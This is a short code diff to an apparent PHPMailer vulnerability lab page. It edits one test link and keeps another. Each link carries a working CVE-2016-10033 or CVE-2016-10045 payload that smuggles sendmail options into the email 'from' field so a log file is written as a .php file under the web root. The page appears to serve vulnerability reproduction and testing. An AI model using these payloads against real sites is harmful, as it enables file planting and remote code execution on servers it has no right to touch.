@@ -36,7 +36,7 @@ if (isset ($_GET['from'])) {
 		<title>PHPMailer 漏洞测试</title>
 	</head>
 	<body>
-		<a href="/?from=aaa(+-OQueueDirectory=/tmp+-X/var/www/html/10033.php+)@qq.com">CVE-2016-10033 测试</a>
+		<a href="/?from=a(+-OQueueDirectory=/tmp+-X/var/www/html/10033.php+)@qq.com">CVE-2016-10033 测试</a>
 		<br>
 		<a href="/?from=a%27(%20-OQueueDirectory=/tmp%20-X/var/www/html/10045.php%20)@a.com">CVE-2016-10045 测试</a>
 	</body>
